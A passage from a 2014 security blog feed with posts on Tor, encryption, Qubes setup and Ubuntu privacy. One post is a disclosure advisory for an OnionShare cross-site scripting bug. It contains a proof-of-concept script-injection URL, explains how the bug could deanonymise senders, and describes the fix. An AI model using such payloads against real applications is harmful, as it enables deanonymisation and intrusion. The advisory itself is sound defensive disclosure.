&lt;p&gt;Finally, Yasha ends his the article with Edward Snowden and the fact that he ran some high-bandwidth Tor nodes, as if this was a bad or sketchy thing for him to do. Running Tor nodes is an excellent thing to do for anyone who cares as much about internet freedom and privacy as Snowden does to contribute to the movement.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Pando is not a credible news source&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Investigative journalism is incredibly important, even when the target of the investigation is an organization like the Tor Project. Following the money is a great way to begin discovering corruption. Pando’s reporting about Tor is not investigative journalism. They set out to attack Tor, found that it gets lots of government funding, and wrote a story about that, pretending that that’s the same thing as Tor being malicious.&lt;/p&gt;
&lt;p&gt;If there were some sort of document, like an email or a contract, that shows that a Tor developer was doing something malicious on behalf of the government, that would be a huge piece of investigative journalism. If there were evidence of an intentional design flaw in the Tor network, similar to NSA’s sabotage of encryption standards through their &lt;a href="https://en.wikipedia.org/wiki/Bullrun_(decryption_program"&gt;BULLRUN&lt;/a&gt;) program, that would be a huge deal. Pando didn’t find anything that wasn’t published on torproject.org.&lt;/p&gt;
&lt;p&gt;Who knows Pando’s true motives—most likely, they’re doing it for the traffic by stirring up controversy, like a tabloid. But regardless of the intentions, they’re certainly attacking one of the most important privacy tools in our collective toolbag. Nothing good will come from people who truly need Tor, such as whistleblowers and dissidents, believing Pando’s nonsense.&lt;/p&gt;
&lt;p&gt;Luckily, I don’t think that’s likely to happen.&lt;/p&gt;
</content></entry><entry><title>Security Advisory: Upgrade to OnionShare 0.4 Immediately</title><link href="https://micahflee.com/2014/07/security-advisory-upgrade-to-onionshare-0-4-immediately/" rel="alternate"></link><updated>2014-07-16T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:bb336019-abc9-3bfa-becf-4cad880a333c</id><content type="html">&lt;p&gt;Yesterday Jacob Appelbaum discovered an input sanitation bug in OnionShare 0.3. It is now fixed, and you should upgrade to the latest version before using it again. You can download the latest version from &lt;a href="https://onionshare.org/"&gt;https://onionshare.org/&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Here’s how the bug worked&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The OnionShare GUI is built using webkit, the browser engine that powers Chrome, and written in HTML, CSS, and Javascript. When you open OnionShare and share a file, you get a URL that looks like this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://e6hkwn4iyfvoaecu.onion/2hff4jdz7pthbbkfxtighpolpu
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;If the recipient loaded that exact URL, it displayed “Download page loaded” in the GUI.  But if the recipient loaded a different URL at the same Tor hidden service address, such as:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://e6hkwn4iyfvoaecu.onion/some_other_url
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The recipient would receive a 404 error and the OnionShare would display “Other page has been loaded: /some_other_url” to the sender. This string, “some_other_url”, is the input that was not being sanitized. If the recipient loaded:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://e6hkwn4iyfvoaecu.onion/&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Then that piece of Javascript would execute inside the OnionShare GUI on the sender’s computer, and “xss” would pop up in an alert box.&lt;/p&gt;
&lt;p&gt;This is a serious vulnerability because the recipient can use it to deanonymize the sender by forcing webkit to load a resource on a website that the attacker controls. This resource will be loaded over the normal internet, not Tor, so the receiver can check their web server log to find the sender’s IP address.&lt;/p&gt;
&lt;p&gt;Additionally, I’ve discovered that the version of webkit that comes with Qt4’s QtWebKit framework is scarily old, and doesn’t get automatic webkit updates. It’s possible that there are year-old public webkit exploits could be used by the receiver to not only deanonymize the sender, but escalate to arbitrary code execution.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;What is not affected&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;If an outside attacker monitors the network traffic of either the sender or the receiver, they still couldn’t compromise the file being sent or the anonymity of either party. The attacker in this case must be the receiver (or someone who eavesdropped on the OnionShare URL that was sent, and started making requests to it before the legitimate receiver downloaded it).&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;How the fix works&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;OnionShare 0.4 fixes this bug in a couple ways. First, the input is now sanitized, so when the receiver loads:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://e6hkwn4iyfvoaecu.onion/&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;It just displays: &lt;code&gt;Other page has been loaded: /&amp;lt;script&amp;gt;alert(‘xss’)&amp;lt;/script&amp;gt;&lt;/code&gt; and doesn’t actually execute any Javascript.&lt;/p&gt;
&lt;p&gt;Additionally, the web server that powers the GUI’s browser now sets the &lt;code&gt;Content-Security-Policy&lt;/code&gt; header to &lt;code&gt;default-src ‘self’; connect-src ‘self'&lt;/code&gt;. This means that the page will refuse to execute any Javascript that is inline (inside &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tags), in attributes like onclick or onmouseover, in links like &lt;code&gt;href="javascript:"&lt;/code&gt;, etc. It will also refuse to load any resources from any external domain. So in case some other cross-site scripting vulnerability exists, the malicious Javascript won’t execute and the sender won’t be able to be deanonymized.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Future plans&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;An important future plan for OnionShare is automatic updating for Windows and OSX, and to be included in Linux distro repositories to use the package manager’s automatic updates.  &lt;a href="https://github.com/micahflee/onionshare/issues/93"&gt;Here’s the issue on GitHub&lt;/a&gt;, but for now users have to update manually.&lt;/p&gt;
&lt;p&gt;At first it seemed like using webkit to build desktop app GUIs was excellent. It makes it quick and simple to deploy powerful, featureful, HTML5-based desktop programs. But considering potential bugs like this one, and that the version of webkit that ships with GUI libraries like Qt and GTK are abysmally old and don’t get security updates, it now seems like this is a bad way of building secure software. I plan on rebuilding the OnionShare GUI using pure Qt widgets, and not including webkit at all. This will dramatically decrease the client-side attack surface.  &lt;a href="https://github.com/micahflee/onionshare/issues/95"&gt;Here’s the issue on GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;When you’re using OnionShare in Tails there is an additional risk. You’re required to run it as the root user because it needs to open a hole in the local firewall (this will no longer be necessary when we remove webkit), and only the root user in Tails can connect to the Tor control port to start a new hidden service. It would be much better if OnionShare ran as the unprivileged amnesia user, and a separate root processes was started just for the specific tasks that require root. &lt;a href="https://github.com/micahflee/onionshare/issues/96"&gt;Here’s the issue on GitHub&lt;/a&gt;.&lt;/p&gt;
</content></entry><entry><title>The Universe Believes in Encryption</title><link href="https://micahflee.com/2014/06/the-universe-believes-in-encryption/" rel="alternate"></link><updated>2014-06-05T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:a182f452-3c5a-3320-8f0b-b398fea597a2</id><content type="html">&lt;p&gt;Our universe is built out of mathematics. Humans have been learning, discovering, and using mathematics for thousands of years because it’s the only thing that can accurately describe what happens around us. The laws of physics are written in mathematics, and they cannot be broken.&lt;/p&gt;
&lt;p&gt;One year ago today the Snowden revelations began. Since then there has been a flood of calls for reform. A federal judge called the NSA “almost Orwellian”. Congress and President Obama have admitted that bulk surveillance of Americans is wrong and should end. But so far we haven’t seen real reform in the US, and we might never see it. Even if the US does pass meaningful surveillance reforms the problem won’t be solved. There are billions of people all over the world that rely on the Internet, and their privacy will continue to get violated by governments around the world.&lt;/p&gt;
&lt;p&gt;On the eve of the &lt;a href="https://www.resetthenet.org/"&gt;Reset the Net&lt;/a&gt; day of action, &lt;a href="http://fight4future.tumblr.com/post/87856695073/a-message-from-edward-snowden-on-the-eve-of-reset-the"&gt;Edward Snowden wrote&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Today, we can begin the work of effectively shutting down the collection of our online communications, even if the US Congress fails to do the same. That’s why I’m asking you to join me on June 5th for Reset the Net, when people and companies all over the world will come together to implement the technological solutions that can put an end to the mass surveillance programs of any government. &lt;strong&gt;This is the beginning of a moment where we the people begin to protect our universal human rights with the laws of nature rather than the laws of nations.&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Like the laws of physics, encryption is also written in mathematics. All information can be expressed in bits: a series of ones and zeros. Through decades of pain-staking research brilliant cryptographers have figured out how to take a random number (called a key) and a collection of organized bits (such as an email, or a video, or a PowerPoint slideshow) and scramble them, using mathematics, to end up with another set of bits that’s indistinguishable from random.&lt;/p&gt;
&lt;p&gt;(Bits that make up encrypted data have no pattern at all. If you point an antenna into space to collect radiation left over from the Big Bang and store that in the form of bits, you won’t be able to tell the difference between that and encrypted data.)&lt;/p&gt;
&lt;p&gt;If you have this indistinguishable-from-random set of bits, and you also have the original key, you can use another series of mathematical operations to get back to the original plaintext — the email, video, or PowerPoint document.&lt;/p&gt;
&lt;p&gt;As long as the key remains a secret, and as long as the math that scrambles the bits is sound, then &lt;a href="https://pressfreedomfoundation.org/encryption-works"&gt;encryption works&lt;/a&gt;. Let me phrase that another way: as long as the key itself isn’t stolen or surveilled, and as long as the math works like it’s supposed to and doesn’t have any flaws, then encryption is &lt;strong&gt;impossible&lt;/strong&gt; to break*. As impossible as it is for a photon to escape the event horizon of a black hole. As impossible as it is to travel faster than the speed of light.&lt;/p&gt;
&lt;p&gt;It’s mind-blowing that encryption is even possible, but thanks to computers it’s easy, and thanks to the free and open source software movement it costs nothing, is built-in to all major operating systems and web browsers, and is available for all humanity to use.&lt;/p&gt;
&lt;p&gt;In the introduction to &lt;a href="http://www.orbooks.com/catalog/cypherpunks/"&gt;Cypherpunks: Freedom and the Future of the Internet&lt;/a&gt;, Julian Assange wrote:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;We discovered something. Our one hope against total domination. A hope that with courage, insight and solidarity we could use to resist. A strange property of the physical universe that we live in.&lt;/p&gt;
&lt;p&gt;The universe believes in encryption.&lt;/p&gt;
&lt;p&gt;It is easier to encrypt information than it is to decrypt it.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The fact that encryption is possible is one of the marvels of our universe and of mathematics, the language that our universe is written in.&lt;/p&gt;
&lt;p&gt;We’re living at a technological crossroads. The Internet could still yet wind up being the greatest tool for human liberation or the greatest tool for ubiquitous surveillance and oppression that civilization has ever seen. But if we’re clever enough we can win. The laws of physics are on our side, if only we accept their help.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;* The adversary can try to guess the key, which is just a random number, but there are quite a few numbers to choose from in the set of all possible keys. The trick is making the set of possible keys big enough that, even devoting all of the computational resources on Earth towards guessing the key, our sun will go supernova before it’s found. With modern crypto, key-guessing is unfeasible.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Finding flaws in the math might be possible. Whenever flaws are found and published, they get fixed (this is why you see so many WPA wifi networks but barely any WEP networks, because WEP flaws have been published about and fixed). Spy agencies might be holding onto secret flaws in crypto that aren’t publicly known, but for the most part they wouldn’t even have to use them since most people and servers are either using known-weak crypto or not using crypto at all. (This is why we need to &lt;a href="https://www.resetthenet.org/"&gt;Reset the Net&lt;/a&gt;.) If we want to restore privacy to humanity, we want to force our adversaries to use up their secret flaws.&lt;/em&gt;&lt;/p&gt;
</content></entry><entry><title>Using Tor Browser Launcher in Qubes</title><link href="https://micahflee.com/2014/05/using-tor-browser-launcher-in-qubes/" rel="alternate"></link><updated>2014-05-09T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:d5143796-2bef-3d33-beb8-ebd51e16b936</id><content type="html">&lt;p&gt;I maintain a piece of software called &lt;a href="https://github.com/micahflee/torbrowser-launcher"&gt;Tor Browser Launcher&lt;/a&gt;. It takes care of downloading Tor Browser Bundle for you, verifying the gpg signature, making sure you’re always using the latest version of Tor Browser, and making it easier to launch.&lt;/p&gt;
&lt;p&gt;I originally only made Tor Browser Launcher work in Debian-based distributions, but since the default templates in &lt;a href="http://qubes-os.org/"&gt;Qubes&lt;/a&gt; are based on Fedora, I recently ported it to RPM-based distributions as well. Here’s how to set it up.&lt;/p&gt;
&lt;p&gt;You’ll need to build an RPM from the torbrowser-launcher source code first. Create a new appvm (I called mine tbl-builder), open a terminal in it, and follow these steps:&lt;/p&gt;
&lt;pre&gt;&lt;code class="lang-bash"&gt;sudo yum -y install git python-psutil python-twisted pygame wmctrl gnupg fakeroot
git clone https://github.com/micahflee/torbrowser-launcher.git
cd torbrowser-launcher
./build_rpm.sh
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;When you’re done, it should have built an RPM package in dist/torbrowser-launcher-[version]-1.noarch.rpm. Go ahead and copy this to your templatevm:&lt;/p&gt;
&lt;pre&gt;&lt;code class="lang-bash"&gt;qvm-copy-to-vm fedora-20-x64 dist/torbrowser-launcher-*.rpm
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now that you’ve copied the RPM to your templatevm, you can shut down and delete the appvm you just created. Next, open a terminal in your templatevm (e.g. fedora-20-x64), install torbrowser-launcher (and then cleanup your templatevm’s home dir):&lt;/p&gt;
&lt;pre&gt;&lt;code class="lang-bash"&gt;sudo yum install QubesIncoming/tbl-builder/torbrowser-launcher-*-1.noarch.rpm
rm -r QubesIncoming
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now shut down your templatevm. Now all you have to do to add Tor Browser to your menu is go to an appvm’s settings, switch to the Applications tab, and move “Tor Browser” and “Tor Browser Settings” from Available to Selected, and save. If your appvm was already running when you installed torbrowser-launcher in your templatevm you’ll have to shut it down and restart it.&lt;/p&gt;
&lt;p&gt;Now you can open Tor Browser the way you open any other software in any of your appvms.&lt;/p&gt;
&lt;p&gt;Qubes also supports a special kind of netvm called a torvm. You can &lt;a href="http://wiki.qubes-os.org/trac/wiki/UserDoc/TorVM"&gt;read about it here&lt;/a&gt;. If you set an appvm’s netvm to be your torvm (making your appvm an anonvm), then all internet traffic in that appvm gets transparently proxied through Tor. This is great for a wide variety of things, but using the Tor Browser itself is still much wiser, because it does a lot of anti-forensics tricks that keep you anonymous. If you just use Firefox in an anonvm, your browser can much more easily be fingerprinted.&lt;/p&gt;
&lt;p&gt;If you’d like to use Tor Browser in an anonvm, you have to do one more step to stop yourself from connecting to Tor through the Tor network. Open Tor Browser in your anonvm, click the onion icon and open Preferences. Under Proxy Settings, change “Use the recommended proxy settings for my version of Firefox” to “Transparent Torification (Requires custom transproxy or Tor router)”. Then go to &lt;a href="https://check.torproject.org/"&gt;https://check.torproject.org/&lt;/a&gt; to verify that you’re still connected to the Tor network.&lt;/p&gt;
&lt;p&gt;That’s it. Now if your Tor Browser gets hacked and the attacker tries to leak your real IP address, it just won’t work. They’ll have to break out of Qubes isolation first.&lt;/p&gt;
</content></entry><entry><title>Dual-booting Qubes and Ubuntu with Encrypted Disks</title><link href="https://micahflee.com/2014/04/dual-booting-qubes-and-ubuntu-with-encrypted-disks/" rel="alternate"></link><updated>2014-04-23T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:9d97e5f0-b039-3061-8263-16469a0ca2d9</id><content type="html">&lt;p&gt;Qubes is my preferred operating system, but occasionally you need to run something else. It’s hard to get certain hardware working the way you expect in Qubes, like webcams or non-disk USB devices. And Qubes VMs don’t support 3D acceleration, which you might occasionally need. You also can’t run VirtualBox inside of Qubes. You normally don’t have any reason to do this, except for very specific cases, like software development with Vagrant.&lt;/p&gt;
&lt;p&gt;So here are instructions for how to dual-boot Qubes R2 rc1 and Ubuntu 14.04 LTS, using disk encryption for both. You should be able to adopt this same technique to dual-boot pretty much any two GNU/Linux distros with disk encryption. Keep in mind that if you’re booted into Ubuntu and you get owned, it’s possible for the attacker to then compromise Qubes. (You have to get really, really, really owned for an attacker who compromised Qubes to then compromise Ubuntu.)&lt;/p&gt;
&lt;p&gt;To make things simpler, I’m not going to use a swap partition for Ubuntu. I have enough RAM in my computer that I don’t need to, and the GUI partitioning tools don’t make it simple to encrypt your swap with the same key that you use to encrypt your root partition.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Installing Ubuntu&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;First, boot to an Ubuntu install disk and start the installation like normal. When you get to the “Installation type” screen, choose “Something else”.&lt;/p&gt;
&lt;p&gt;&lt;img src="ubuntu1.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Delete all the partitions you already have on your disk. Then select the free space and click the “+” to create Ubuntu’s plaintext /boot partition. Make the size 1024 MB, type “Primary”, location “Beginning of this space”, use as ext4, and set the mount point to /boot. Then click ok.&lt;/p&gt;
&lt;p&gt;![(ubuntu2.png)]&lt;/p&gt;
&lt;p&gt;Now click the free space again and click the “+” to create Ubuntu’s encrypted root partition. For me, I’m going to make my Ubuntu partition only 20 GB, leaving the rest of the space for Qubes. So for size, I’m using 20480 MB. Set type to “Primary” and location to “Beginning of this space”. For use as, choose “physical volume for encryption”, and enter the disk encryption passphrase you want to use for Ubuntu twice. When you’re done, click ok.&lt;/p&gt;
&lt;p&gt;&lt;img src="ubuntu3.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Now your partition table should look like this. In /dev/sda you’ll have sda1, which is /boot, and sda2, which is “unknown”, and then a bunch of free space. But above that you’ll have /dev/mapper/sda2_crypt, which contains your encrypted partition.&lt;/p&gt;
&lt;p&gt;&lt;img src="ubuntu4.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Click on /dev/mapper/sda2_crypt and click Change. You can keep use as as ext4, and then select / as the mount point, and click ok.&lt;/p&gt;
&lt;p&gt;&lt;img src="ubuntu5.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Now you’ve set up Ubuntu’s partitions. This is important: before you start installing Ubuntu, under “Device for boot loader installation” choose /dev/sda1 instead of /dev/sda. When you install Qubes, the bootloader will be installed to /dev/sda, so it’s important that you put Ubuntu’s bootloader somewhere else.&lt;/p&gt;
&lt;p&gt;Your partitioning should look like this:&lt;/p&gt;
&lt;p&gt;&lt;img src="ubuntu6.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Now click Install Now. It will pop up an error warning you that you’re not using a swap partition. You can click Continue. Then finish the rest of the steps, and wait for Ubuntu to install. When it’s done go ahead and restart.&lt;/p&gt;
&lt;p&gt;Your computer won’t actually boot though, since you installed your Ubuntu bootloader to /dev/sda1 instead of /dev/sda. Instead of trying to boot into your newly installed Ubuntu, let’s install Qubes.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Installing Qubes&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Boot to a Qubes install disk. Choose Install Qubes. Click “Installation Destination” and confirm that your hard drive is selected. Then click Done.&lt;/p&gt;
&lt;p&gt;It should show you something like this: “You have 217.96 GB of free space, which is enough to install Qubes. What would you like to do?”&lt;/p&gt;
&lt;p&gt;&lt;img src="qubes1.jpg" alt=""&gt;&lt;/p&gt;
&lt;p&gt;As long as it offers to install Qubes in the disk’s free space, the Qubes installer will handle the rest of the partitioning. Choose “Automatically configure my Qubes installation to the disk(s) I selected and return me to the main menu”, and make sure “Encrypt my data” is checked as well. Click Continue.&lt;/p&gt;
&lt;p&gt;Type your Qubes disk encryption passphrase twice, and click Save Passphrase.&lt;/p&gt;
&lt;p&gt;&lt;img src="qubes2.jpg" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Then click Begin Installation, and wait for Qubes to install. When it’s done, reboot.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Fixing Grub&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;You’re not done quite yet. When you turn on your computer this time, it will automatically boot into Qubes. Now we need to add Ubuntu as a boot option.&lt;/p&gt;
&lt;p&gt;When you boot into Qubes for the first time you’ll need to follow the setup wizard. Once this is done and you’ve logged in to Qubes, open a terminal in dom0 (in KDE, click the start button, System Tools &amp;gt; Konsole). Then edit /etc/grub.d/40_custom using vim (or nano):&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo vim /etc/grub.d/40_custom
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Add this to the bottom:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;menuentry "Ubuntu" {
set root=(hd0,1)
chainloader +1
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Then reinstall grub:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo grub2-mkconfig -o /boot/grub2/grub.cfg
sudo grub2-install /dev/sda
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Then reboot the computer.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Wrapping Up&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Now when turn on your computer, you immediately start at the grub that comes with Qubes, with the options:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Qubes, with Xen hypervisor&lt;/li&gt;
&lt;li&gt;Advanced options for Qubes (with Xen hypervisor)&lt;/li&gt;
&lt;li&gt;Ubuntu&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If you choose “Qubes, with Xen hypervisor” it asks for your Qubes encryption passphrase and boots into Qubes.&lt;/p&gt;
&lt;p&gt;If you choose Ubuntu, you get chainloaded to /dev/sda1, where you installed Ubuntu’s grub. It then asks for Ubuntu’s encryption passphrase and then boots Ubuntu.&lt;/p&gt;
</content></entry><entry><title>The Operating System That Can Protect You Even if You Get Hacked</title><link href="https://micahflee.com/2014/04/the-operating-system-that-can-protect-you-even-if-you-get-hacked/" rel="alternate"></link><updated>2014-04-10T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:c26f9f2a-f94a-3511-9343-b154ef8a7949</id><content type="html">&lt;p&gt;&lt;em&gt;This was originally published on the &lt;a href="https://pressfreedomfoundation.org/blog/2014/04/operating-system-can-protect-you-even-if-you-get-hacked"&gt;Freedom of the Press Foundation’s blog&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;We wrote about the importance of the &lt;a href="https://pressfreedomfoundation.org/blog/2014/04/help-support-little-known-privacy-tool-has-been-critical-journalists-reporting-nsa"&gt;Tails operating system&lt;/a&gt; to all of the NSA journalists last week, but there’s also another little-known operating system that journalists should consider using if they find themselves in high-risk scenarios. It’s called &lt;a href="http://qubes-os.org/"&gt;Qubes&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I’ve only been using Qubes for a few weeks, but I feel like my operating system is now a digital fortress. Let me try to explain why, and how Qubes differs from Tails.&lt;/p&gt;
&lt;p&gt;Qubes’ design is based off an important law of software: all programs contain bugs. Some of these are security vulnerabilities. Your computer can get hacked by viewing a Flash video or using javascript in your web browser: this is likely how NSA’s QUANTUM/FOXACID programs hack people. Your computer could also get hacked by opening a PDF, or a Microsoft Word or LibreOffice document, or just by viewing a JPG or GIF.&lt;/p&gt;
&lt;p&gt;If any piece of software gets compromised, your whole computer is compromised. The attacker can look at your files, log your keystrokes, take screenshots, steal your encryption keys, and read the emails that you type before you even have a chance to encrypt them.&lt;/p&gt;
&lt;p&gt;Developers can (and should) try to make their software more secure, but software will never be perfect. Trying to not get hacked is difficult when you have powerful adversaries, yet still have to get work done. Short of never connecting your computer to the internet, the best way to stay secure is to minimize the damage caused when you do eventually get hacked and “sandbox” the most vulnerable programs away from the rest of your computer. Qubes makes this more straight-forward than any other operating system I’ve used.&lt;/p&gt;
&lt;p&gt;Qubes uses virtual machines to let you manage separate “security domains”. A virtual machine (VM) is basically a tiny operating system running inside of your real operating system. If your VM gets hacked, the attacker is able to access the files and read keystrokes in that VM, but not in other VMs or on your host computer. In Qubes all software (besides the desktop environment) is running inside of VMs, and you can easily and efficiently make as many as you need for whatever purposes you need. It’s also designed in such a way that if one VM gets infected with malware, the malware won’t be there the next time you reboot that VM.&lt;/p&gt;
&lt;p&gt;For example, you may want to use Pidgin, an instant messaging application with &lt;a href="https://pressfreedomfoundation.org/encryption-works#otr"&gt;OTR encryption&lt;/a&gt; capability, to chat with people securely. But Pidgin is notorious for its memory corruption vulnerabilities: the kind of bug that attackers can use to take over your computer by IMing you a weird-looking message. (All publicly known Pidgin vulnerabilities have been fixed if you’re using the latest version, but there’s always the possibility that there are vulnerabilities that have never been reported to the developers. These are called zero day vulnerabilities, and agencies like NSA and FBI spend lots of money to buy information about them.)&lt;/p&gt;
&lt;p&gt;In order to use Pidgin as safely as possible, you can create an AppVM (the Qubes word for a VM to run specific apps in) that you use only for Pidgin. If a Pidgin-zero-day-wielding attacker sends you a weird-looking message that takes over your computer, all it will actually take over is your Pidgin AppVM. The worst that the attacker can do is steal your OTR keys and spy on your chat conversations. Everything else on your computer, such as your work documents, your PGP key, and your password database, will remain safe from the attacker.&lt;/p&gt;
&lt;p&gt;Another example that would be useful to journalists: if you’re writing an article about sensitive documents, you can create an “air-gapped” AppVM that contains these documents, and any files or drafts associated with the story. If you open a document in this AppVM that tries to phone home to alert someone that it’s been opened, it will fail because this AppVM doesn’t have internet access. And if you open a malicious document that hacks this AppVM, the malware won’t be able to exfiltrate any of your files because it won’t have internet access. And finally, if some other part of your computers gets compromised, like your web browser, the attackers won’t have access to these sensitive work files.&lt;/p&gt;
&lt;p&gt;You can also easily use “disposable VMs”, AppVMs that you create for a specific purpose and delete when you’re done with them, to open documents that you don’t completely trust. If that PDF someone emailed you is actually malicious and tries to take over your computer, it will only take over the disposable VM. But if it actually contains something useful, you’ll still be able to read it.&lt;/p&gt;
&lt;p&gt;You can do this all on one computer using a single desktop manager. This is one of the most powerful features about Qubes.&lt;/p&gt;
&lt;p&gt;You can always choose to isolate software like this on traditional operating systems using tools like VirtualBox or VMWare, but it’s impossible to do as good a job of locking down your computer as you can with Qubes.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Current state of the project&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;At the moment you have to be pretty tech savvy in order to get the full benefits of Qubes. And it doesn’t hurt if you’re already a Linux nerd. I think this can be improved, but Qubes will never be a “turn on and forget” security tool. Which security domains each user needs is completely dependent on their preferences and security needs. But if you understand your needs and understand how to use and configure AppVMs to fit them, you’ll be able to use your computer with much higher security than if you were using a traditional OS.&lt;/p&gt;
&lt;p&gt;The places where usability could be greatly improved is hardware support inside of VMs. I spent hours trying to figure out how to make my laptop’s internal webcam accessible to an AppVM. The solution finally ended up being to give the AppVM control of my USB controller and to change permissions on /dev/video0 to be world-writable inside of the AppVM — at the expense of having access to one my USB ports, and while opening up other USB-related security problems (which normal OSes always have). Hardware issues like this keep popping up for me: USB sticks work fine, but USB ethernet cards don’t; I can’t easily import photos from my Android phone. I have enough patience, googlefu, and Linux experience to solve them, but I think many users would be lost.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Qubes vs Tails?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Qubes and Tails have fundamentally different use-cases. They’re both very important, and I use both operating systems every day.&lt;/p&gt;
&lt;p&gt;Tails is for staying anonymous. When you use it on a computer, it doesn’t leave a trace that it was ever booted. It changes your MAC address before you connect to a network, and it forces all traffic to go over the Tor network, ensuring that you don’t make a technical mistake and accidentally leak your IP address. When you use the web browser that comes with Tails, your traffic looks exactly like the traffic of all other Tor users.&lt;/p&gt;
&lt;p&gt;Qubes is for staying secure while still being able to use a wide variety of software that might contain zero day vulnerabilities, but it’s not for staying anonymous. Qubes supports cool networking tricks, like making an AppVM where all traffic is forced to go through Tor, but this doesn’t incorporate most of the anonymity tricks that Tails excels at.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Bottom line&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;For maximum security, I would recommend that people use Qubes on their computer for all their everyday, non-anonymous needs: checking email, chatting, using social media and browsing the web, developing software, doing research, writing articles. Since you do all of this work in AppVMs that run Linux (and optionally some of it in AppVMs that run Windows), you get the latest and best tools to work with, and it’s simple to install new software. For more sensitive needs where anonymity is important, you can use Tor Browser Bundle inside of an AppVM.&lt;/p&gt;
&lt;p&gt;And for the most sensitive needs, as the NSA journalists explained, you should boot to Tails.&lt;/p&gt;
</content></entry><entry><title>Ubuntu is finally taking privacy seriously</title><link href="https://micahflee.com/2014/04/ubuntu-is-finally-taking-privacy-seriously/" rel="alternate"></link><updated>2014-04-03T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:381bf74a-66fd-388d-b9ac-07c4864739e4</id><content type="html">&lt;p&gt;&lt;strong&gt;Update: A couple people have pointed out that the privacy changes won’t actually take affect in 14.04, which means that &lt;a href="https://fixubuntu.com/"&gt;fixubuntu.com&lt;/a&gt; will still be necessary until at least 14.10, which will be released in October. Oops.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In October 2012, Canonical made a horrible mistake. They included a “feature” in Ubuntu 12.10 that has been widely considered &lt;a href="https://www.fsf.org/blogs/rms/ubuntu-spyware-what-to-do"&gt;adware&lt;/a&gt; and &lt;a href="https://bugs.launchpad.net/ubuntu/+bug/1070111"&gt;spyware&lt;/a&gt;. I blogged about the new Ubuntu’s &lt;a href="https://www.eff.org/deeplinks/2012/10/privacy-ubuntu-1210-amazon-ads-and-data-leaks"&gt;Amazon ads and data leaks&lt;/a&gt; for EFF at the time, with the main ask being that Dash’s online search should be an opt-in feature and not enabled by default.&lt;/p&gt;
&lt;p&gt;Ubuntu’s disregard for user privacy become the impetus that caused me to &lt;a href="https://micahflee.com/2013/01/why-im-leaving-ubuntu-for-debian/"&gt;switch to Debian&lt;/a&gt; (though nowadays I’m running &lt;a href="http://qubes-os.org/trac"&gt;Qubes&lt;/a&gt;). And in order to make it easier to fix Ubuntu’s privacy problems on new computers I helped people set up, I started the website &lt;a href="https://fixubuntu.com/"&gt;Fix Ubuntu&lt;/a&gt;.&lt;/p&gt;
